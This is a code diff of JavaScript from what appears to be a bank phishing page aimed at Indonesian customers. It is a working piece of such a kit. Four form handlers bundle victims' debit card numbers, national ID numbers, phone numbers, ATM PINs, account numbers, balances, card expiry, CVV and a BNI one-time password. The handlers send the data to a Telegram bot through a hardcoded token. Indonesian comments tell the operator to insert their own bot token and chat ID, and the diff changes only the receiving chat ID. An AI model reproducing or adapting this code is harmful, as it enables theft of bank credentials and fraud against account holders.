@@ -9,7 +9,7 @@
  
 
     var token = '6412748765:AAHXOm7qWWw5PEKFcCHpnadJXV7XEc6DhzY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6541745267'; // Ganti dengan chat id dari bot yang kamu buat
+    var grup = '6273200192'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -42,7 +42,7 @@ function sendData(event){
     var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁 :%0A' + debit.value + '%0A𝗡𝗜𝗞 𝗞𝗧𝗣 :%0A' + nikktp.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :%0A' + nomorhandphone.value + '%0A𝗣𝗜𝗡 𝗔𝗧𝗠 :%0A' + pinatm.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 :%0A' + reke.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝘀𝗲𝗱𝗶𝗮 :%0A' + "Rp " + saldo1.value;
     
     var token = '6412748765:AAHXOm7qWWw5PEKFcCHpnadJXV7XEc6DhzY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6541745267'; // Ganti dengan chat id dari bot yang kamu buat
+    var grup = '6273200192'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -79,7 +79,7 @@ function kirimPesan(event) {
     var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 %3A%0A' + nope.value +  '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 %3A%0A' + nama.value + '%0A𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 %3A%0A' + bulan.value + "/" + tahun.value + '%0A𝗖𝗩𝗩 %3A%0A' + pesan.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿 %3A%0A' + "Rp " + saldo.value + '%0A%0A𝗢𝗧𝗣%20𝗕𝗡𝗜:%0A' +   pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
 
     var token = '6412748765:AAHXOm7qWWw5PEKFcCHpnadJXV7XEc6DhzY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6541745267'; // Ganti dengan chat id dari bot yang kamu buat
+    var grup = '6273200192'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -124,7 +124,7 @@ event.preventDefault();
 
 
     var token = '6412748765:AAHXOm7qWWw5PEKFcCHpnadJXV7XEc6DhzY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6541745267'; // Ganti dengan chat id dari bot yang kamu buat
+    var grup = '6273200192'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
